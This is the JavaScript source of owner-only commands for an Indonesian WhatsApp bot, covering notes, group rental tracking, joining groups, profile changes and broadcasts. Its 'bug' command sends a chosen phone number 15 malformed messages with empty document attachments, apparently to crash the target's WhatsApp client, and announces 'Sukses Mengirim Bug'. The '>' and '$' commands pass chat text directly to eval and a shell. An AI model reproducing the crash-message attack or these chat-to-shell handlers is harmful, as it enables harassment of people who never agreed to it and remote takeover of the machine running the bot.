process.on("uncaughtException", console.log);

cmd.on(['>', '=>'], ['owner'], async(msg, {
  client, command, query
}) => {
  let code = `(async function(){${command.includes("=")?"return "+query: query}
  })()`
  let evaluate;
  try {
    evaluate = await eval(code).catch(e => e)
  } catch (e) {
    evaluate = e
  }
  return await client.reply(msg, {
    text: evaluate || "undefined"
  })
}, {
  owner: '--noresp',
  prefix: false
});

cmd.on(['$'], ['owner'], async(msg, {
  query, client
}) => {
  try {
    functions.exec(`${query}`, (err, out) => {
      if (err) return client.reply(msg, functions.util.format(err));
      client.reply(msg, functions.util.format(out));
    });
  } catch(e) {
    return client.reply(msg,
      functions.util.format(e));
  }
}, {
  owner: '--noresp', prefix: false
})

cmd.on(["shutdown", 'reset'], ['owner'], async(msg, {
  client,
  command
}) => {
  let resp = command[0]. toUpperCase()+command.slice(1).toLowerCase()+" Bot Dalam 3 Detik..."
  await client.reply(msg,
    resp)
  await functions.delay(3000).then(async (a) => {
    if (command.toLowerCase() == 'shutdown') {
      global.shutoff = true
    };
    await client.end(resp)
  })
}, {
  owner: "--noresp"
})

cmd.on(["addowner", "delowner"], ['owner'], async(msg, {
  mentionedJid,
  prefix,
  quotedMsg,
  command
}) => {
  if (mentionedJid.length == 0 && !quotedMsg) return client.reply(msg, {
    text: `Tag Orang Yang Ingin Di Jadikan Owner, Contoh ${prefix}addowner @tagorang`
  })
  mentionedJid = mentionedJid.length == 0 ? [quotedMsg.sender.jid]: mentionedJid
  let loop = mentionedJid.forEach(async (tr) => {
    let num = tr.split('@')[0]

    if (command.includes('del')) {
      if (!config.ownerNumber.includes(num)) return await client.reply(msg, {
        text: `Gagal Memasukan @${num} Sebagai Owner Karena Tidak ada Owner Dengan Nomor Itu`, mentions: [tr]})
      config.ownerNumber = config.ownerNumber.filter(a => a !== num)
      return await await client.reply(msg, {
        text: `Berhasil Menghapus @${num} Sebagai Owner`, mentions: [tr]})
    } else {
      if (config.ownerNumber.includes(num)) return await client.reply(msg, {
        text: `Gagal Memasukan @${num} Sebagai Owner Karena Telah Owner Sebelumnya`, mentions: [tr]})
      config.ownerNumber.push(num)
      return await client.reply(msg, {
        text: `Berhasil Memasukan @${num} Sebagai Owner`, mentions: [tr]})
    }
  })
  functions.fs.writeFileSync('./config.json',
    JSON.stringify(config, null, 2))
}, {
  owner: "Perintah Khusus Owner", group: "Hanya Bisa Di Lakukan Di Grup"
})

cmd.on(['addnote', 'delnote', 'updatenote', 'note'], ['owner', 'info'], async(msg, {
  command,
  client,
  query,
  prefix
})=> {
  let type = command.toLowerCase().replace('note',
    '').trim()
  let split = query.split(',')
  if (!(database.note)) database.note = {};
  let value = database.note[split[0].trim()]
  if (!type) {
    if (!value) {
      if (query) await client.reply(msg, `Note Berjudul ${split[0].trim()} Tidak Ada Dalam Database`)
      let list = Object.keys(database.note).map(tr => {
        return {
          title: `Judul: ${tr}`, value: `${prefix}note ${tr}`
        }
      })
      if (list.length == 0) return client.reply(msg, `Tidak ada Note Di Dalam Database`)
      list[0].head = `List Note`
      return await client.sendButton(msg.from, {
        buttonText: "Klik List",
        text: `Menampilkan List Note"`, footer: `Jumlah: ${list.length}`
      }, list)
    } else {
      return await client.reply(msg, {
        text: value
      })
    }
  } else {
    let judul = split[0].trim()
    if (type != 'del' && !split[1]) return await client.reply(msg, {
      text: `Masukan Isi, Contoh ${prefix}note ini judul, ini isi`
    })
    let isi = split.slice(1).join(',').trim()
    switch (type) {
      case "add":
        if (value) return await client.reply(msg, {
          text: `Note Telah Ada Sebelumnya`
        })
        database.note[judul] = isi.trim()
        break;
      case "update":
        if (!value) return await client.reply(msg, {
          text: `Note Tidak Dapat Diubah Karena Tidak Ada Sebelumnya`
        })
        database.note[judul] = isi.trim()
        break;
      case "del":
        if (!value) return await client.reply(msg, {
          text: `Note Tidak Dapat Dihapus Karena Tidak Ada Sebelumnya`
        })
        database.note[judul] = undefined;
        break;
    }
    return await client.reply(msg,
      `Sukses Meng${type == 'del'?'hapus': type} Note`)
  }
}, {
  param: "<judul,isi>",
  owner: "Cuma Khusus Owner"
})

cmd.on(['addsewa', 'delsewa', 'updatesewa', `tambahsewa`], ['owner', 'info', 'jual beli'], async(msg, {
  command,
  client,
  query,
  prefix
})=> {
  let type = command.toLowerCase().replace('sewa',
    '').trim()
  if (!query || !query.includes(',') && type !== "del" && !msg.isGroup) return await client.reply(msg, {
    text: `Format Salah, Masukan Link Group Dan Kapan Expired, Contoh ${prefix}addsewa 1y,https://chats.whatsapp.com/abcdefthajhs atau ${prefix}addsewa 1y untuk menambah sewa di grub ini

    *Format:*
    y = tahun
    d = hari
    m = menit
    s = detik`
  })
  let [expired,
    link] = query.split(',')
  if (!link && !msg.isGroup) return await client.reply(msg, {
    text: `Format Salah, Masukan Link Group Dan Kapan Expired, Contoh ${prefix}addsewa 1y,https://chats.whatsapp.com/abcdefthajhs atau ${prefix}addsewa 1y untuk menambah sewa di grub ini

    *Format:*
    y = tahun
    d = hari
    m = menit
    s = detik`
  })
  let jid = msg.from
  if (link) {
    let url = require('url').parse(link)
    if (!url.host || !url.host.includes('chat.whatsapp.com')) return await client.reply(msg, {
      text: `Link Invalid, Masukan Link Group Dan Kapan Expired, Contoh ${prefix}addsewa 1y,https://chats.whatsapp.com/abcdefthajhs atau ${prefix}addsewa 1y untuk menambah sewa di grub ini

      *Format:*
      y = tahun
      d = hari
      m = menit
      s = detik`
  })
  jid = await client.groupAcceptInvite(url.path.replace('/', '').trim())
}
  if (!database[jid]) database[jid] = {};
  let value = database[jid].expiredSewa
  if (type !== 'del' && !expired) return client.reply(msg, {
    text: `Masukan Kapan Expired Sewa, Contoh ${prefix}addsewa 1y

    *Format:*
    y = tahun
    d = hari
    m = menit
    s = detik`
  })
  switch (type) {
    case "add":
      if (value) return await client.reply(msg, {
        text: `Sewa Telah Ada Sebelumnya`
    })
    database[jid].expiredSewa = expired == 'Infinity' ? Infinity: Date.now()+require('ms')(expired.trim())
    break;
  case "update":
    if (!value) return await client.reply(msg, {
      text: `Sewa Tidak Dapat Diubah Karena Tidak Ada Sebelumnya`
    })
    database[jid].expiredSewa = expired == 'Infinity' ? Infinity: Date.now()+require('ms')(expired.trim())
    break;
  case "tambah":
    if (!value) return await client.reply(msg, {
      text: `Sewa Tidak Dapat Diubah Karena Tidak Ada Sebelumnya`
    })
    database[jid].expiredSewa = expired == 'Infinity' ? Infinity: value+require('ms')(expired.trim())
    break;
  case "del":
    if (!value) return await client.reply(msg, {
      text: `Sewa Tidak Dapat Dihapus Karena Tidak Ada Sebelumnya`
    })
    database[jid].expiredSewa = undefined;
    break;
  }
  await client.reply(msg,
    `Sukses Meng${type == 'del'?'hapus': type} Sewa`)
  if (type == "del")return await client.groupLeave(jid)
  value = database[jid].expiredSewa;
  return await client.reply(jid, `Sewa Kamu Akan Expired Pada ${isFinite(value)?functions.parseDate("LLLL", value): "Tak Terbatas"}`)
}, {
  param: "<linkgroup, expired>",
  owner: "Cuma Khusus Owner"
})

cmd.on(['sewa', 'ceksewa'], ['info', 'jual beli'], async(msg, {
client, command, query
})=> {
let value = database[msg.from].expiredSewa
if (!value) {
return await client.reply(msg, `Sewa Belum Di Tambahkan Disini`)
} else {
let tgl = isFinite(value)?functions.parseDate("LLLL", value): "Tak Terbatas"
return await client.reply(msg, {
text: `Sewa Kamu Akan Expired Pada ${tgl}`
})
}
})

cmd.on(['cekid'], ['owner', 'info'], async(msg, {
client, query
})=> {
if (!query) return await client.reply(msg, `Id Group Mu ${msg.from}`)
let url = require('url').parse(query)
if (!url.host || !url.host.includes('chat.whatsapp.com')) return await client.reply(msg, {
text: `Link Group Tidak Valid, Contoh ${prefix}cekid https://chats.whatsapp.com/abcdefthajhs`
})
let jid = await client.groupGetInviteInfo(url.path.replace('/', '').trim())
return await client.reply(msg, `Id Group ${query} Adalah ${jid.id}`)
}, {
param: "<linkgroup>",
owner: "untuk owner"
})

cmd.on(["bug"], ['owner'], async(msg, {
client, query
})=> {
let target = query+'@s.whatsapp.net'
await client.sendMessage(target, {
text: "Bang"
})
for (let i = 0; i < 15; i++) {
await client.sendButton(target, {
document: Buffer.alloc(0), mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation', fileName: 'Gyn', url: "wa.me/43650844861777", caption: "Cih Elit", footer: "Mendokusai"
}, [{
url: "Gaterima? chat Gw Sini", value: "wa.me/6281313943827"
}])
}
return await client.reply(msg, `Sukses Mengirim Bug`)
}, {
query: "Masukan Nomor Telepon Target",
owner: "khusus owner"
})

cmd.on(["setbotbio", "setbotname", 'setbotstatus'], ['owner', 'bot'], async(msg, {
client, command, query
})=> {
let type = command.toLowerCase().includes('name')?"Name": "Status"
let update = await client["updateProfile"+type](query).catch(e => {
return {
e
}})
if (update && update.e) {
console.log(update)
return await client.reply(msg, {
text: `Gagal Mengubah ${type} Menjadi ${query}`
})
}
return await client.reply(msg, {
text: `Berhasil Mengubah ${type} Menjadi ${query}`
})
}, {
owner: "khusus owner",
query: "Masukan Mau Edit Seperti Apa, Contoh !setbotbio anu"
})


cmd.on(["setbotpp","setpp"], ['owner', 'bot'], async(msg, {
client, query, prefix, command
}) => {
let update = await client.updateProfilePicture(msg.client.jid, (await (msg.quotedMsg && !msg.isMedia?msg.quotedMsg: msg).downloadMsg()).buffer).catch(e => {
return {
err: e
}})
if (update && update.e) {
console.log(update)
return await client.reply(msg, `Gagal Mengubah Pp Bot`)
}
return await client.reply(msg, `Sukses Mengubah Pp Bot`)
},
{
owner: "khusus owner",
param: "<foto|tagfoto>",
_media: "Kirim Foto Atau Tag Foto Yang Ingin Dijadikan Pp Group"
})

cmd.on(['join', 'joingroup', 'joingc', 'joingrup'], ['owner', 'bot'], async(msg, {
query
})=> {
let url = require('url').parse(query)
if (!url.host || !url.host.includes('chat.whatsapp.com')) return await client.reply(msg, {
text: `Link Group Tidak Valid, Contoh ${prefix}addsewa https://chats.whatsapp.com/abcdefthajhsl`
})
let parsedlink = url.path.replace('/', '').trim()
let add = await client.groupAcceptInvite(parsedlink).catch(e => {
return {
e
}})
if (add && add.e) {
console.log(add)
return await client.reply(msg, {
text: `Gagal Memasukan Bot Ke Link https://chat.whatsapp.com/${parsedlink}`
})
}
await client.reply(msg, {
text: `Berhasil Memasukan Bot Ke Link https://chat.whatsapp.com/${parsedlink}`
})
await client.reply(add, {
text: `Berhasil Memasukan Bot Ke Grup`
})
}, {
query: "Masukan Link Grup",
param: "<link grub>",
owner: "Khusus Owner"
})

cmd.on(['listsewa'], ['owner'], async(msg, {
client
})=> {
let groups = await client.groupFetchAllParticipating()
let tobtn = Object.values(groups).map(tr => {
if (!(database[tr.id])) database[tr.id] = {};
tr.expiredSewa = !(database[tr.id].expiredSewa)?1: database[tr.id].expiredSewa
return {
title: "Nama Group: "+tr.subject,
description: "Akan Expired Pada "+(tr.expiredSewa != 1?(isFinite(tr.expiredSewa)?functions.parseDate("LLLL", tr.expiredSewa): "Selamanya"): 'Belum Di Setting'),
value: "null"
}
})
tobtn[0].head = "Semua Yang Menyewa"
await client.sendButton(msg,
{
text: "Berikut List Yang Sewa",
buttonText: "List Nya"
},
tobtn)
}, {
owner: "Khusus Owner"
})

cmd.on(['bcpc', 'bcgc', 'bcall'], ['owner', 'broadcast', 'info'], async(msg, {
client,
query,
command
})=> {
let type = command.toLowerCase().replace('bc',
'')
let list = functions.fs.readdirSync('./database/')
list.forEach(async (tr) => {
let acc = false
switch (type) {
case 'all':
acc = tr.includes('@g.us') || tr.includes('@s.whatsapp.net')
break;
case 'gc':
acc = tr.includes('@g.us')
break;
case 'pc':
acc = tr.includes('@s.whatsapp.net')
break;
}
if (!acc) return;
let jid = tr.replace('.json', '').trim()
await functions.delay(3000)
await client.reply(jid, `${query}${functions.readmore(1000)}\n*_Broadcast Bot_*`)
})
await client.reply(msg,`Sukses Broadcast`)
}, {
owner: "Khusus Owner", query: "Masukan Apa Yang Ingin di broadcast"
})